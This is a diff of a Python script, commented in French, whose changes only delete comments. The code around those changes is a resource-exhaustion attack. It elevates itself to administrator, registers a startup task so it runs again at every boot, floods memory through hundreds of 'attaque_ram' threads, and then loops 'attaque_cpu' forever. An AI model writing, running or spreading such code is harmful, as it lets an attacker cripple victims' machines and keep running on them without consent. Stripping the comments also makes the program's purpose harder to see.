@@ -67,14 +67,14 @@ def run_as_admin():
     try:
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
     except Exception:
-        pass  # Ignorer les erreurs si l'élévation échoue
-    sys.exit()  # Quitter après avoir demandé les droits administratifs
+        pass  
+    sys.exit()  
 
 
 def get_script_path():
     script_path = sys.argv[0]
     if not Path(script_path).exists():
-        sys.exit(1)  # Quitter si le script n'existe pas
+        sys.exit(1)  
     return script_path
 
 
@@ -90,7 +90,7 @@ def create_startup_task(script_path):
     try:
         subprocess.run(command, shell=True, check=True)
     except subprocess.CalledProcessError:
-        sys.exit(1)  # Quitter si la tâche échoue
+        sys.exit(1) 
 
 
 def generer_donnees_alea(taille_mo):
@@ -114,8 +114,8 @@ def main():
     if not is_admin():
         run_as_admin()  # Élever le script si pas administrateur
 
-    script_path = get_script_path()  # Obtenir le chemin du script
-    create_startup_task(script_path)  # Créer une tâche de démarrage
+    script_path = get_script_path()  
+    create_startup_task(script_path)  
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=os.cpu_count() * 8) as executor:
         futures_ram = [executor.submit(attaque_ram) for _ in range(100 * os.cpu_count())]
@@ -124,10 +124,10 @@ def main():
         for f in concurrent.futures.as_completed(futures_ram):
             f.result()
     except KeyboardInterrupt:
-        sys.exit(0)  # Sortie propre si l'exécution est interrompue
+        sys.exit(0)  
 
     while True:
-        attaque_cpu()  # Garder le CPU occupé indéfiniment
+        attaque_cpu()  
 
 
 if __name__ == "__main__":
